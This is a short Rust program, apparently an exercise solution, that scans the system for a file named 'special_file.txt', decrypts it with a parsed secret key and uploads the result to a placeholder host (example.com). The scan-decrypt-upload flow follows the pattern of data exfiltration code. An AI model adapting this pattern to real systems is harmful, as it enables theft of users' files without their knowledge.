use P3::*;

fn main() {
    let file_paths = scan_system().expect("Failed to scan system");
    let secret_key = parse_secret().expect("Failed to parse secret key");

    for file_path in file_paths {
        if file_path.ends_with("special_file.txt") {
            let mut file = File::open(&file_path).expect("Failed to open special_file.txt");
            let mut encrypted_data = Vec::new();
            file.read_to_end(&mut encrypted_data).expect("Failed to read special_file.txt");

            let decrypted_data = decrypt_file(&encrypted_data, &secret_key);
            send_contents(decrypted_data, "http://example.com/upload").expect("Failed to send contents");
        }
    }
}